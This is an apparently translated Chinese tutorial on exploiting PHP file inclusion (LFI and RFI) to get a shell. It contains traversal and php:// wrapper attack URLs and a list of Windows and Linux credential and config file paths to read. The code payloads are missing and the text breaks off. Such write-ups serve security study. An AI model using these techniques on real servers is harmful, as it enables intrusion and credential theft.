# php文件包含漏洞Getshell的不同姿势
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 相关函数
php中引发文件包含漏洞的通常是以下四个函数：
  1. [include()](http://www.php.net/manual/en/function.include.php)
  2. [include_once()](http://php.net/manual/en/function.include-once.php)
  3. [require()](http://php.net/manual/en/function.require.php)
  4. [require_once()](http://php.net/manual/en/function.require-once.php)
`reuqire()` 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。
[](https://p2.ssl.qhimg.com/t01e367e4989e52f60e.png)
`include()` 如果出错的话，只会提出警告，会继续执行后续语句。
[](https://p0.ssl.qhimg.com/t012240b4abdcd24d0c.png)
`require_once()` 和 `include_once()` 功能与`require()` 和 `include()`
类似。但如果一个文件已经被包含过了，则 `require_once()` 和 `include_once()`
则不会再包含它，以避免函数重定义或变量重赋值等问题。
当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码：
在同目录下有个phpinfo.txt，其内容为``。则只需要访问：
    fileinclude.php?file=phpinfo.txt
即可成功解析phpinfo
[](https://p4.ssl.qhimg.com/t01221534011e178a5e.png)
###  场景
  1. 具有相关的文件包含函数。
  2. 文件包含函数中存在动态变量，比如 `include $file;`。
  3. 攻击者能够控制该变量，比如`$file = $_GET['file'];`。
###  分类
**LFI(Local File Inclusion)漏洞**
本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。
这个漏洞不受`allow_url_fopen = On`和`allow_url_include = On`这两个的影响。
比如这里我在php.ini中把它们改成off，然后重启服务器：
[](https://p3.ssl.qhimg.com/t01f658f7edc65c9d4c.png)
访问`?page=../../../phpinfo.php`，依然可以成功解析phpinfo
[](https://p4.ssl.qhimg.com/t014f769974cb8ca608.png)
**RFI(Remote File Inclusion)漏洞**
远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。  
但RFI的利用条件较为苛刻，需要php.ini中进行配置
  1. `allow_url_fopen = On`
  2. `allow_url_include = On`
两个配置选项均需要为On，才能远程包含文件成功。
比如这里我在php.ini中把它们改成off，然后重启服务器：
[](https://p1.ssl.qhimg.com/t01a87cf4fa69c790b4.png)
访问`?page=http://192.168.1.4`，会报错：
    Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_fopen=0 in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36
    Warning: include(http://192.168.1.4): failed to open stream: no suitable wrapper could be found in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36
    Warning: include(): Failed opening 'http://192.168.1.4' for inclusion (include_path='.;C:\php\pear;../../external/phpids/0.6/lib/') in D:\phpStudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php on line 36
[](https://p3.ssl.qhimg.com/t010cace12a5ff1c90a.png)
两个配置选项都改回来变成on，再重启服务器，远程文件包含便成功了
[](https://p4.ssl.qhimg.com/t01e545cf7e9d235e2c.png)
###  要查看的敏感文件的绝对路径
这篇文章更加详细：[Windows linux 敏感目录
路径汇总](https://blog.csdn.net/weixin_50464560/article/details/119063335)
这里也列一下会用到的敏感文件的绝对路径：
    WINDOWS下:
    c:/boot.ini //查看系统版本
    c:/windows/php.ini //php配置信息
    c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码
    c:/winnt/php.ini
    c:/winnt/my.ini
    C:\Windows\win.ini  //用于保存系统配置文件
    c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码
    c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码
    c:\Program Files\Serv-U\ServUDaemon.ini
    c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置
    c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码
    c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此
    c:\Program Files\RhinoSoft.com\ServUDaemon.exe
    C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件
    //存储了pcAnywhere的登陆密码
    c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件
    c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.
    c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机
    d:\APACHE\Apache2\conf\httpd.conf
    C:\Program Files\mysql\my.ini
    C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
    LUNIX/UNIX 下:
    /usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件
    /usr/local/apache2/conf/httpd.conf
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
    /usr/local/app/php5/lib/php.ini //PHP相关设置
    /etc/sysconfig/iptables //从中得到防火墙规则策略
    /etc/httpd/conf/httpd.conf // apache配置文件
    /etc/rsyncd.conf //同步程序配置文件
    /etc/my.cnf //mysql的配置文件
    /etc/redhat-release //系统版本
    /etc/issue
    /etc/issue.net
    /usr/local/app/php5/lib/php.ini //PHP相关设置
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置
    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
    /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
    /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
    /etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件
    /usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看
    /usr/local/resin-pro-3.0.22/conf/resin.conf 同上
    /usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看
    /etc/sysconfig/iptables 查看防火墙策略
## 包含姿势
下面例子中测试代码均为：
`allow_url_fopen` 默认为 On  
`allow_url_include` 默认为 Off
若有特殊要求，会在利用条件里指出。
###  php伪协议
PHP 带有很多内置 URL 风格的封装协议，可用于类似 `fopen()`、 `copy()`、 `file_exists()` 和
`filesize()` 的文件系统函数。 除了这些封装协议，还能通过 `stream_wrapper_register()` 来注册自定义的封装协议。
PHP伪协议事实上就是支持的协议与封装协议（12种）
    file:// — 访问本地文件系统
    http:// — 访问 HTTP(s) 网址
    ftp:// — 访问 FTP(s) URLs
    php:// — 访问各个输入/输出流（I/O streams）
    PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。
    zlib:// — 压缩流
    data:// — 数据（RFC 2397）
    glob:// — 查找匹配的文件路径模式
    phar:// — PHP 归档
    ssh2:// — Secure Shell 2
    rar:// — RAR
    ogg:// — 音频流
    expect:// — 处理交互式的流
**file://**
file://伪协议用于访问本地文件系统
利用条件：
  1. 对allow_url_include不做要求。
  2. 对allow_url_fopen不做要求。
姿势：
    fileinclude.php?file=file://C:/Windows/win.ini
[](https://p3.ssl.qhimg.com/t01e01dacbd448af196.png)
**php://input**
可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 `enctype="multipart/form-data"` 的时候
`php://input` 是无效的。
利用条件：
  1. allow_url_include = On。
  2. 对allow_url_fopen不做要求。
姿势：
    fileinclude.php?file=php://input
    POST:
[](https://p3.ssl.qhimg.com/t01016035a7cb813fa9.png)
#### 注意：碰到`file_get_contents()`就要想到用`php://input`绕过
碰到`file_get_contents()`就要想到用`php://input`绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。
`file_get_contents()`：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。
  * 除此之外，通过实践我发现这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像`curl`命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面`php://input`可以将POST的数据读过来来赋值给参数。
**测试代码：**
结果：
[](https://p2.ssl.qhimg.com/t0194e56352f4df72eb.png)
**php://input（命令执行）**
利用条件：
  1. allow_url_include = On。
  2. 对allow_url_fopen不做要求。
姿势：
    fileinclude.php?file=php://input